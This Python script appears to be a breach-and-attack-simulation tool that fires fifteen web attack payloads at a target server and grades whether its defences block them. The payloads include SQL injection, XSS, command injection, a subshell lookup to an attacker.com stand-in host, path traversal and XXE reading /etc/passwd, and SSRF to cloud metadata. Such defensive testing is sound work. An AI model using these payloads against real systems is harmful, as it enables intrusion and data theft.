#!/usr/bin/env python3
"""
Apex Sentinel: Automated Breach & Attack Simulation (BAS) Suite.

Simulates 15 non-destructive modern attack vectors against the target deployment
to verify active defensive posture and calculate real-time mitigation metrics.
"""
from __future__ import annotations

import json
import sys
import time
import urllib.error
import urllib.parse
import urllib.request

VECTORS = [
    ("SQL Injection (Union Select)", "GET", "/api/v1/auth/login?id=1%20UNION%20SELECT%20*%20FROM%20users--", {}, None),
    ("SQL Injection (Boolean Tautology in JSON Body)", "POST", "/api/v1/auth/login", {"Content-Type": "application/json"}, json.dumps({"username": "admin' OR 1=1--", "password": "x"}).encode()),
    ("SQL Comment Evasion (UN/**/ION)", "GET", "/api/v1/items?filter=UN/**/ION/**/SEL/**/ECT/**/1,2,3", {}, None),
    ("Cross-Site Scripting (Inline Tag)", "GET", "/search?q=%3Cscript%3Ealert(1)%3C/script%3E", {}, None),
    ("Cross-Site Scripting (SVG Event in Body)", "POST", "/feedback", {"Content-Type": "application/json"}, json.dumps({"comment": "<svg/onload=alert('XSS')>"}).encode()),
    ("OS Command Injection (Pipe Chaining)", "POST", "/tools", {"Content-Type": "application/json"}, json.dumps({"target": "8.8.8.8 | whoami"}).encode()),
    ("Subshell Command Substitution", "GET", "/lookup?host=$(whoami).attacker.com", {}, None),
    ("Local File Inclusion (Path Traversal)", "GET", "/download?file=../../../../etc/passwd", {}, None),
    ("Double-Encoded Directory Traversal", "GET", "/file?path=..%252f..%252fetc%252fpasswd", {}, None),
    ("SSRF Cloud IMDS Exfiltration", "GET", "/fetch?url=http://169.254.169.254/latest/meta-data/", {}, None),
    ("Server-Side Template Injection (SSTI)", "GET", "/render?template={{7*7}}", {}, None),
    ("XML External Entity (XXE)", "POST", "/xml", {"Content-Type": "application/xml"}, b'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY x SYSTEM "file:///etc/passwd">]><foo>&x;</foo>'),
    ("Automated Security Scanner Probe", "GET", "/api/v1/data", {"User-Agent": "sqlmap/1.7#stable"}, None),
    ("Sensitive Honeypot Probe", "GET", "/.env", {}, None),
    ("JavaScript Prototype Pollution", "POST", "/settings", {"Content-Type": "application/json"}, json.dumps({"__proto__": {"isAdmin": True}}).encode()),
]


def run_audit(target_url: str):
    target_url = target_url.rstrip("/")
    print("=" * 70)
    print(" 🛡️  APEX SENTINEL BREACH & ATTACK SIMULATION (BAS) AUDIT")
    print(f" Target Host: {target_url}")
    print("=" * 70)

    passed = 0
    total = len(VECTORS)
    latencies = []

    for idx, (name, method, path, headers, data) in enumerate(VECTORS, 1):
        full_url = target_url + path
        req = urllib.request.Request(full_url, data=data, headers=headers, method=method)
        # Use mock external IP header to test public IP quarantine behavior
        req.add_header("X-Forwarded-For", f"198.51.100.{idx + 10}")

        start_time = time.time()
        try:
            with urllib.request.urlopen(req, timeout=5.0) as resp:
                elapsed = (time.time() - start_time) * 1000
                latencies.append(elapsed)
                print(f" [{idx:02d}/{total:02d}] ❌ BYPASSED: {name} (HTTP {resp.status})")
        except urllib.error.HTTPError as err:
            elapsed = (time.time() - start_time) * 1000
            latencies.append(elapsed)
            if err.code in (403, 429, 413, 415):
                passed += 1
                body = err.read().decode("utf-8", errors="ignore")
                action = "QUARANTINED" if "QUARANTINED" in body else "BLOCKED"
                print(f" [{idx:02d}/{total:02d}] ✅ INTERCEPTED ({action}): {name} [HTTP {err.code} - {elapsed:.1f}ms]")
            else:
                print(f" [{idx:02d}/{total:02d}] ⚠️  UNEXPECTED CODE: {name} [HTTP {err.code}]")
        except Exception as exc:
            print(f" [{idx:02d}/{total:02d}] ⚠️  NETWORK NOTICE: {name} ({exc})")

    score = (passed / total) * 100.0
    avg_latency = sum(latencies) / len(latencies) if latencies else 0.0

    print("=" * 70)
    print(f" AUDIT COMPLETE: {passed}/{total} Attack Vectors Successfully Repelled.")
    print(f" Security Posture Score: {score:.1f}%")
    print(f" Mean Time to Intercept: {avg_latency:.1f} ms")
    if score >= 95.0:
        print(" Grade: 🏆 A+ ENTERPRISE DEFENSIVE FORTRESS")
    elif score >= 80.0:
        print(" Grade: 🛡️ B+ HARDENED")
    else:
        print(" Grade: ⚠️ ATTENTION REQUIRED")
    print("=" * 70)


if __name__ == "__main__":
    url = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:8000"
    run_audit(url)
